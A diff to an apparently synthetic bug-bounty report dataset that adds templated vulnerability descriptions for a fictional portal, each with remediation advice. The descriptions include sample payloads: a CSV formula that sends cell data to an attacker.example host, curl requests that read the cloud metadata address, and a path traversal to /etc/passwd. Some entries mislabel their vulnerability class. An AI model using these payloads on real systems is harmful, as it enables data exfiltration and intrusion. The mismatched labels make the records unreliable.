+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16873,7 +17004,8 @@
           "offset": "1d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://open-data.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17004,7 +17136,8 @@
           "offset": "3d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17111,7 +17244,8 @@
           "offset": "6d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17239,7 +17373,8 @@
           "offset": "7d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17339,7 +17474,8 @@
           "offset": "2d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.eichenwald-digital.foo/profile`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17466,7 +17602,8 @@
           "offset": "5d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://open-data.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17598,7 +17735,8 @@
           "offset": "2d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17754,7 +17892,8 @@
           "offset": "7d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17914,7 +18053,8 @@
           "offset": "6d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18025,7 +18165,8 @@
           "offset": "3d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18175,7 +18316,8 @@
           "offset": "6d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18287,7 +18429,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18426,7 +18569,8 @@
           "offset": "4d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18551,7 +18695,8 @@
           "offset": "4d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18683,7 +18828,8 @@
           "offset": "5d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18851,7 +18997,8 @@
           "offset": "4d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18991,7 +19138,8 @@
           "offset": "2d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19135,7 +19283,8 @@
           "offset": "1d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19249,7 +19398,8 @@
           "offset": "17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19385,7 +19535,8 @@
           "offset": "3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19525,7 +19676,8 @@
           "offset": "2d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19669,7 +19821,8 @@
           "offset": "6d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19788,7 +19941,8 @@
           "offset": "2d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19943,7 +20097,8 @@
           "offset": "7d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20045,7 +20200,8 @@
           "offset": "1d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20209,7 +20365,8 @@
           "offset": "4d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20368,7 +20525,8 @@
           "offset": "1d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20483,7 +20641,8 @@
           "offset": "21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20643,7 +20802,8 @@
           "offset": "5d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20771,7 +20931,8 @@
           "offset": "1d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20902,7 +21063,8 @@
           "offset": "7d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
